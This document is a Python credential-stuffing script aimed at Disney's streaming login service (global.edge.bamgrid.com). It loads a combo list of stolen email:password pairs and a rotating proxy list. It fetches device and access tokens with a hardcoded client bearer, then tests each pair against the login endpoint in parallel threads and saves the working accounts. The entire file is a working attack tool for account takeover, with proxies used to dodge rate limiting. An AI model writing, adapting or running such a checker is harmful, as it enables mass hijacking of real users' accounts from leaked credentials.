from lib import request, loader
from random import choice
from concurrent import futures

loader.load_combo('amine.txt')
loader.load_proxies('https', file='proxies.txt')

def check(email, password):
   proxy = choice(loader.proxies)

   # Get authorization token
   token = request.get_response('POST', 'https://global.edge.bamgrid.com/devices', json={"deviceFamily":"browser","applicationRuntime":"msie","deviceProfile":"windows","attributes":{}}, headers={"Accept": "*/*","Accept-Encoding": "gzip, deflate, br","Accept-Language": "en-us","Authorization": "Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84","Connection": "keep-alive","Content-Length": "96","Content-Type": "application/json","Host": "global.edge.bamgrid.com","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko","x-bamsdk-client-id": "disney-svod-3d9324fc",}, proxies=proxy).response.json()['assertion']

   # Block one
   authorization = request.get_response('POST', 'https://global.edge.bamgrid.com/token', data=f'grant_type=urn%3aietf%3aparams%3aoauth%3agrant-type%3atoken-exchange&latitude=0&longitude=0&platform=browser&subject_token={token}&subject_token_type=urn%3abamtech%3aparams%3aoauth%3atoken-type%3adevice', headers={"Accept": "*/*","Accept-Encoding": "gzip, deflate, br","Accept-Language": "en-us","Authorization": "Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84","Connection": "keep-alive","Content-Length": "601","Content-Type": "application/x-www-form-urlencoded","Host": "global.edge.bamgrid.com","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko","x-bamsdk-client-id": "disney-svod-3d9324fc",}, proxies=proxy).response.json()['access_token']

   # Block two

   data = {"email":f"{email}","password":f"{password}"}
   headers = {"Accept": "*/*","Accept-Encoding": "gzip, deflate, br","Accept-Language": "en-us","Authorization": f"Bearer {authorization}","Connection": "keep-alive","Content-Type": "application/json","Host": "global.edge.bamgrid.com","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko",}

   block = request.get_response('POST', 'https://global.edge.bamgrid.com/idp/login', json=data, headers=headers, proxies=proxy)

   block.fail(statement='Bad credentials')
   block.success(statement='id_token', save=True, save_this=f'{email}:{password}')
   request.result()
   # End

futures.ThreadPoolExecutor().map(check, loader.users, loader.passwords)

